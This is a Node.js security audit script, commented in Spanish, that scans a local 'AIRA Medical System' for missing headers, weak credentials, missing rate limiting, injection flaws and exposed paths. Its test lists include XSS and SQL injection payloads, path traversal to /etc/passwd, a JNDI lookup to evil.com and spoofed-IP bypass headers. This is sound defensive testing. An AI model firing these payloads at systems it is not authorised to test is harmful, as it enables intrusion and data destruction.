/**
 * AIRA Medical System - Security Audit Tool (Native Node.js)
 * Auditoría completa usando solo módulos nativos de Node.js
 * No requiere dependencias externas
 */

const https = require('https');
const http = require('http');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

class SecurityAuditor {
    constructor() {
        this.targetUrl = 'http://localhost:8082';
        this.results = {
            vulnerabilities: [],
            securityChecks: [],
            recommendations: []
        };
        this.startTime = Date.now();
    }

    async runFullAudit() {
        console.log('🛡️ INICIANDO AUDITORÍA DE SEGURIDAD - AIRA MEDICAL SYSTEM');
        console.log('=' .repeat(80));
        console.log(`🎯 Target: ${this.targetUrl}`);
        console.log(`⏰ Inicio: ${new Date().toISOString()}`);
        console.log('=' .repeat(80));

        try {
            // Fase 1: Information Gathering
            await this.informationGathering();

            // Fase 2: Security Headers Analysis
            await this.securityHeadersAnalysis();

            // Fase 3: Authentication Testing
            await this.testAuthentication();

            // Fase 4: Input Validation Testing
            await this.testInputValidation();

            // Fase 5: OWASP Top 10 Critical Issues
            await this.testCriticalVulnerabilities();

            // Fase 6: Dependency Analysis
            await this.analyzeDependencies();

            // Fase 7: Generate Report
            await this.generateReport();

        } catch (error) {
            console.error('❌ Error en auditoría:', error);
            this.addVulnerability('CRITICAL', 'Audit Tool Error', error.message);
        }

        console.log('\n✅ AUDITORÍA COMPLETADA');
        console.log(`⏱️ Duración: ${Math.round((Date.now() - this.startTime) / 1000)} segundos`);
        console.log(`🚨 Vulnerabilidades encontradas: ${this.results.vulnerabilities.length}`);
    }

    async httpRequest(options, data = null) {
        return new Promise((resolve, reject) => {
            const url = new URL(options.url || this.targetUrl);
            const isHttps = url.protocol === 'https:';
            const httpModule = isHttps ? https : http;

            const requestOptions = {
                hostname: url.hostname,
                port: url.port || (isHttps ? 443 : 80),
                path: url.pathname + url.search,
                method: options.method || 'GET',
                headers: options.headers || {},
                timeout: options.timeout || 5000
            };

            if (data) {
                const jsonData = JSON.stringify(data);
                requestOptions.headers['Content-Type'] = 'application/json';
                requestOptions.headers['Content-Length'] = Buffer.byteLength(jsonData);
            }

            const req = httpModule.request(requestOptions, (res) => {
                let body = '';
                res.on('data', (chunk) => body += chunk);
                res.on('end', () => {
                    resolve({
                        status: res.statusCode,
                        headers: res.headers,
                        data: body
                    });
                });
            });

            req.on('error', reject);
            req.on('timeout', () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });

            if (data) {
                req.write(JSON.stringify(data));
            }

            req.end();
        });
    }

    async informationGathering() {
        console.log('\n📊 FASE 1: INFORMATION GATHERING');

        try {
            const response = await this.httpRequest({
                url: this.targetUrl
            });

            const headers = response.headers;

            console.log('🔍 Server Information:');
            console.log(`   - Server: ${headers.server || 'Unknown'}`);
            console.log(`   - X-Powered-By: ${headers['x-powered-by'] || 'Not disclosed'}`);
            console.log(`   - Status: ${response.status}`);

            this.results.securityChecks.push({
                category: 'Server Availability',
                check: 'HTTP Response',
                status: response.status === 200 ? 'PASS' : 'FAIL',
                details: `Status: ${response.status}`
            });

            if (headers.server) {
                this.addVulnerability('LOW', 'Information Disclosure',
                    `Server header reveals: ${headers.server}`);
            }

            if (response.data.includes('AIRA')) {
                console.log('✅ AIRA Medical System detectado');
                this.results.securityChecks.push({
                    category: 'Application Detection',
                    check: 'AIRA System',
                    status: 'PASS',
                    details: 'AIRA Medical System identified'
                });
            }

        } catch (error) {
            console.error('❌ Error en Information Gathering:', error.message);
            this.addVulnerability('HIGH', 'Service Unavailable',
                `Target server not reachable: ${error.message}`);
        }
    }

    async securityHeadersAnalysis() {
        console.log('\n🛡️ FASE 2: SECURITY HEADERS ANALYSIS');

        try {
            const response = await this.httpRequest({
                url: this.targetUrl
            });

            const headers = response.headers;

            const requiredHeaders = [
                'x-content-type-options',
                'x-frame-options',
                'strict-transport-security',
                'content-security-policy'
            ];

            const missingHeaders = [];

            for (const header of requiredHeaders) {
                const headerKey = Object.keys(headers).find(key => key.toLowerCase() === header.toLowerCase());
                if (!headerKey) {
                    missingHeaders.push(header);
                    this.addVulnerability('MEDIUM', 'Missing Security Header',
                        `Header faltante: ${header}`);
                } else {
                    this.results.securityChecks.push({
                        category: 'Security Headers',
                        check: header,
                        status: 'PASS',
                        details: headers[headerKey]
                    });

                    // CSP Analysis
                    if (header === 'content-security-policy') {
                        const csp = headers[headerKey];
                        if (csp.includes("'unsafe-inline'")) {
                            this.addVulnerability('MEDIUM', 'Weak CSP',
                                'CSP permite unsafe-inline');
                        }
                        if (csp.includes("'unsafe-eval'")) {
                            this.addVulnerability('HIGH', 'Weak CSP',
                                'CSP permite unsafe-eval');
                        }
                    }
                }
            }

            if (missingHeaders.length === 0) {
                console.log('✅ Todos los headers de seguridad críticos están presentes');
            }

        } catch (error) {
            console.error('Error analizando headers:', error.message);
        }
    }

    async testAuthentication() {
        console.log('\n🔐 FASE 3: AUTHENTICATION TESTING');

        // Test 1: Weak credentials
        console.log('   🔍 Testing weak credentials...');
        const weakCredentials = [
            { dni: 'admin', password: 'admin' },
            { dni: '12345678', password: '1234' },
            { dni: 'test', password: 'test' },
            { dni: '', password: '' }
        ];

        for (const creds of weakCredentials) {
            try {
                const response = await this.httpRequest({
                    url: `${this.targetUrl}/api/auth/verify`,
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                }, creds);

                if (response.status === 200) {
                    this.addVulnerability('CRITICAL', 'Weak Authentication',
                        `Credenciales débiles funcionan: ${JSON.stringify(creds)}`);
                }
            } catch (error) {
                // Expected for invalid credentials
            }
        }

        // Test 2: Mock token abuse
        console.log('   🔍 Testing mock token abuse...');
        try {
            const response = await this.httpRequest({
                url: `${this.targetUrl}/api/auth/verify`,
                method: 'POST',
                headers: {
                    'Authorization': 'Bearer mock-jwt-token-for-development',
                    'Content-Type': 'application/json'
                }
            }, {});

            if (response.status === 200) {
                this.addVulnerability('CRITICAL', 'Hardcoded Credentials',
                    'Mock development token funciona en producción');
            }
        } catch (error) {
            // Expected
        }

        // Test 3: Rate limiting
        console.log('   🚦 Testing rate limiting...');
        await this.testRateLimiting();
    }

    async testRateLimiting() {
        const successCount = [];
        const requests = [];

        // Send 20 rapid requests (reduced for faster testing)
        for (let i = 0; i < 20; i++) {
            requests.push(
                this.httpRequest({
                    url: `${this.targetUrl}/api/auth/verify`,
                    method: 'POST',
                    timeout: 1000
                }, { dni: 'test', password: 'test' }).then(response => {
                    if (response.status !== 429) {
                        successCount.push(response.status);
                    }
                }).catch(() => {})
            );
        }

        await Promise.all(requests);

        if (successCount.length > 15) {
            this.addVulnerability('HIGH', 'Missing Rate Limiting',
                `${successCount.length}/20 requests exitosos sin rate limiting`);
        } else {
            this.results.securityChecks.push({
                category: 'Rate Limiting',
                check: 'Authentication Endpoint',
                status: 'PASS',
                details: `${20 - successCount.length}/20 requests bloqueados`
            });
        }
    }

    async testInputValidation() {
        console.log('\n✅ FASE 4: INPUT VALIDATION TESTING');

        // Test XSS payloads
        console.log('   🔍 Testing XSS payloads...');
        const xssPayloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "'; alert('XSS'); //",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}"
        ];

        for (const payload of xssPayloads) {
            try {
                const response = await this.httpRequest({
                    url: `${this.targetUrl}/api/auth/verify`,
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                }, { dni: payload, password: payload });

                // Check if payload is reflected in response
                if (response.data && response.data.includes(payload)) {
                    this.addVulnerability('HIGH', 'XSS',
                        `Payload reflejado: ${payload.substring(0, 20)}...`);
                }
            } catch (error) {
                // Expected
            }
        }

        // Test SQL Injection
        console.log('   💉 Testing SQL Injection...');
        const sqliPayloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --"
        ];

        for (const payload of sqliPayloads) {
            try {
                const response = await this.httpRequest({
                    url: `${this.targetUrl}/api/auth/verify`,
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                }, { dni: payload, password: payload });

                if (response.status === 200) {
                    this.addVulnerability('HIGH', 'Potential SQL Injection',
                        `SQLi payload aceptado: ${payload.substring(0, 20)}...`);
                }
            } catch (error) {
                // Expected
            }
        }

        // Test Path Traversal
        console.log('   📁 Testing Path Traversal...');
        const pathTraversalPayloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd"
        ];

        for (const payload of pathTraversalPayloads) {
            try {
                const response = await this.httpRequest({
                    url: `${this.targetUrl}/api/patients/${payload}`,
                    method: 'GET'
                });

                if (response.status === 200 && response.data.includes('root:')) {
                    this.addVulnerability('CRITICAL', 'Path Traversal',
                        `Path traversal exitoso: ${payload}`);
                }
            } catch (error) {
                // Expected
            }
        }
    }

    async testCriticalVulnerabilities() {
        console.log('\n🚨 FASE 5: CRITICAL VULNERABILITIES TESTING');

        // Test 1: Directory listing
        console.log('   📂 Testing directory listing...');
        const sensitivePaths = [
            '/admin',
            '/config',
            '/logs',
            '/api/users',
            '/backup',
            '/.env',
            '/package.json'
        ];

        for (const path of sensitivePaths) {
            try {
                const response = await this.httpRequest({
                    url: `${this.targetUrl}${path}`,
                    method: 'GET'
                });

                if (response.status === 200) {
                    this.addVulnerability('MEDIUM', 'Directory Exposure',
                        `Path accesible: ${path} (${response.status})`);
                }
            } catch (error) {
                // Expected for protected paths
            }
        }

        // Test 2: Authentication bypass attempts
        console.log('   🔓 Testing authentication bypass...');
        const bypassHeaders = [
            { 'X-Forwarded-For': '127.0.0.1' },
            { 'X-Real-IP': '127.0.0.1' },
            { 'X-Originating-IP': '127.0.0.1' },
            { 'X-Remote-IP': '127.0.0.1' }
        ];

        for (const headers of bypassHeaders) {
            try {
                const response = await this.httpRequest({
                    url: `${this.targetUrl}/api/patients`,
                    method: 'GET',
                    headers: headers
                });

                if (response.status === 200) {
                    this.addVulnerability('HIGH', 'Authentication Bypass',
                        `Header injection exitosa: ${JSON.stringify(headers)}`);
                }
            } catch (error) {
                // Expected
            }
        }

        // Test 3: HTTP methods testing
        console.log('   🔍 Testing dangerous HTTP methods...');
        const dangerousMethods = ['TRACE', 'OPTIONS', 'PUT', 'DELETE', 'PATCH'];

        for (const method of dangerousMethods) {
            try {
                const response = await this.httpRequest({
                    url: this.targetUrl,
                    method: method
                });

                if (method === 'TRACE' && response.status === 200) {
                    this.addVulnerability('HIGH', 'HTTP TRACE Enabled',
                        'TRACE method permite cross-site tracing');
                }

                if (method === 'OPTIONS' && response.headers.allow) {
                    const allowedMethods = response.headers.allow.split(',').map(m => m.trim());
                    const dangerousAllowed = allowedMethods.filter(m =>
                        ['DELETE', 'PUT', 'PATCH'].includes(m.toUpperCase())
                    );

                    if (dangerousAllowed.length > 0) {
                        this.addVulnerability('MEDIUM', 'Dangerous HTTP Methods',
                            `Métodos peligrosos permitidos: ${dangerousAllowed.join(', ')}`);
                    }
                }
            } catch (error) {
                // Expected
            }
        }
    }

    async analyzeDependencies() {
        console.log('\n📦 FASE 6: DEPENDENCY ANALYSIS');

        try {
            // Check package.json
            const packageJsonPath = './package.json';
            if (fs.existsSync(packageJsonPath)) {
                const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
                const dependencies = {...packageJson.dependencies, ...packageJson.devDependencies};

                console.log('   📋 Analyzing dependencies...');

                // Check for known vulnerable packages
                const vulnerablePackages = {
                    'express': ['<4.17.0'],
                    'helmet': ['<4.0.0'],
                    'axios': ['<0.21.0'],
                    'lodash': ['<4.17.21'],
                    'socket.io': ['<2.4.0']
                };

                for (const [pkg, version] of Object.entries(dependencies)) {
                    if (vulnerablePackages[pkg]) {
                        this.addVulnerability('MEDIUM', 'Vulnerable Dependency',
                            `${pkg}@${version} tiene vulnerabilidades conocidas`);
                    }
                }

                console.log(`   ✅ Analyzed ${Object.keys(dependencies).length} dependencies`);
            } else {
                console.log('   ⚠️ package.json not found');
            }

            // Try npm audit
            try {
                console.log('   🔍 Running npm audit...');
                const auditOutput = execSync('npm audit --json', {
                    encoding: 'utf8',
                    stdio: ['pipe', 'pipe', 'pipe']
                });

                const auditResults = JSON.parse(auditOutput);

                if (auditResults.vulnerabilities) {
                    for (const [packageName, vuln] of Object.entries(auditResults.vulnerabilities)) {
                        const severity = vuln.severity === 'high' ? 'HIGH' :
                                       vuln.severity === 'moderate' ? 'MEDIUM' : 'LOW';
                        this.addVulnerability(severity, 'Vulnerable Dependency',
                            `${packageName}@${vuln.version}: ${vuln.title}`);
                    }
                }

                console.log(`   📊 npm audit completed`);
            } catch (error) {
                console.log('   ⚠️ npm audit not available or failed');
            }

        } catch (error) {
            console.error('Error analyzing dependencies:', error.message);
        }
    }

    async generateReport() {
        console.log('\n📊 FASE 7: GENERATING SECURITY REPORT');

        const report = {
            metadata: {
                scanDate: new Date().toISOString(),
                target: this.targetUrl,
                duration: Math.round((Date.now() - this.startTime) / 1000),
                auditor: 'AI Security Auditor v1.0 (Native)'
            },
            summary: {
                totalVulnerabilities: this.results.vulnerabilities.length,
                critical: this.results.vulnerabilities.filter(v => v.severity === 'CRITICAL').length,
                high: this.results.vulnerabilities.filter(v => v.severity === 'HIGH').length,
                medium: this.results.vulnerabilities.filter(v => v.severity === 'MEDIUM').length,
                low: this.results.vulnerabilities.filter(v => v.severity === 'LOW').length,
                securityChecksPassed: this.results.securityChecks.filter(c => c.status === 'PASS').length,
                securityChecksFailed: this.results.securityChecks.filter(c => c.status === 'FAIL').length
            },
            vulnerabilities: this.results.vulnerabilities,
            securityChecks: this.results.securityChecks,
            recommendations: this.generateRecommendations()
        };

        // Save JSON report
        const jsonReportPath = `./security-audit-report-${Date.now()}.json`;
        fs.writeFileSync(jsonReportPath, JSON.stringify(report, null, 2));

        // Generate console summary
        console.log('\n📋 EXECUTIVE SUMMARY:');
        console.log('=' .repeat(60));
        console.log(`🚨 Total Vulnerabilities: ${report.summary.totalVulnerabilities}`);
        console.log(`   🔴 Critical: ${report.summary.critical}`);
        console.log(`   🟠 High: ${report.summary.high}`);
        console.log(`   🟡 Medium: ${report.summary.medium}`);
        console.log(`   🟢 Low: ${report.summary.low}`);
        console.log(`✅ Security Checks Passed: ${report.summary.securityChecksPassed}`);
        console.log(`❌ Security Checks Failed: ${report.summary.securityChecksFailed}`);
        console.log('');
        console.log(`📄 Detailed Report: ${jsonReportPath}`);

        // Show critical and high vulnerabilities
        const criticalHighVulns = this.results.vulnerabilities.filter(v =>
            v.severity === 'CRITICAL' || v.severity === 'HIGH');

        if (criticalHighVulns.length > 0) {
            console.log('\n🚨 CRITICAL & HIGH VULNERABILITIES:');
            console.log('=' .repeat(60));
            criticalHighVulns.forEach(vuln => {
                console.log(`\n${vuln.severity}: ${vuln.category}`);
                console.log(`   ${vuln.description}`);
            });
        }

        // Show top recommendations
        const topRecommendations = this.generateRecommendations().slice(0, 5);
        if (topRecommendations.length > 0) {
            console.log('\n📋 TOP RECOMMENDATIONS:');
            console.log('=' .repeat(60));
            topRecommendations.forEach((rec, index) => {
                console.log(`\n${index + 1}. [${rec.priority}] ${rec.category}`);
                console.log(`   ${rec.recommendation}`);
            });
        }

        return report;
    }

    generateRecommendations() {
        const recommendations = [];
        const vulnCategories = [...new Set(this.results.vulnerabilities.map(v => v.category))];

        const categoryMap = {
            'Missing Security Header': {
                priority: 'HIGH',
                recommendation: 'Implementar todos los headers de seguridad OWASP',
                implementation: 'Usar middleware Helmet.js con configuración estricta'
            },
            'Hardcoded Credentials': {
                priority: 'CRITICAL',
                recommendation: 'Eliminar credenciales hardcodeadas y usar variables de entorno',
                implementation: 'Configurar .env con variables seguras y JWT tokens reales'
            },
            'Vulnerable Dependency': {
                priority: 'MEDIUM',
                recommendation: 'Actualizar dependencias vulnerables',
                implementation: 'Ejecutar npm audit fix y mantener dependencias actualizadas'
            },
            'Weak Authentication': {
                priority: 'CRITICAL',
                recommendation: 'Implementar autenticación robusta con validación',
                implementation: 'Usar bcrypt para passwords, JWT con expiración, y rate limiting'
            },
            'Missing Rate Limiting': {
                priority: 'HIGH',
                recommendation: 'Implementar rate limiting en todos los endpoints',
                implementation: 'Usar express-rate-limit con límites estrictos para APIs'
            },
            'XSS': {
                priority: 'HIGH',
                recommendation: 'Implementar sanitización de input y output encoding',
                implementation: 'Usar DOMPurify para frontend y helmet para CSP'
            },
            'Directory Exposure': {
                priority: 'MEDIUM',
                recommendation: 'Proteger directorios sensibles',
                implementation: 'Configurar NGINX/Apache rules y middleware de seguridad'
            }
        };

        for (const category of vulnCategories) {
            if (categoryMap[category]) {
                recommendations.push({
                    category,
                    ...categoryMap[category]
                });
            }
        }

        return recommendations.sort((a, b) => {
            const priorityOrder = { 'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3 };
            return priorityOrder[a.priority] - priorityOrder[b.priority];
        });
    }

    addVulnerability(severity, category, description) {
        const vulnerability = {
            severity,
            category,
            description,
            timestamp: new Date().toISOString()
        };

        this.results.vulnerabilities.push(vulnerability);
    }
}

// Ejecutar auditoría
if (require.main === module) {
    const auditor = new SecurityAuditor();
    auditor.runFullAudit().catch(console.error);
}

module.exports = SecurityAuditor;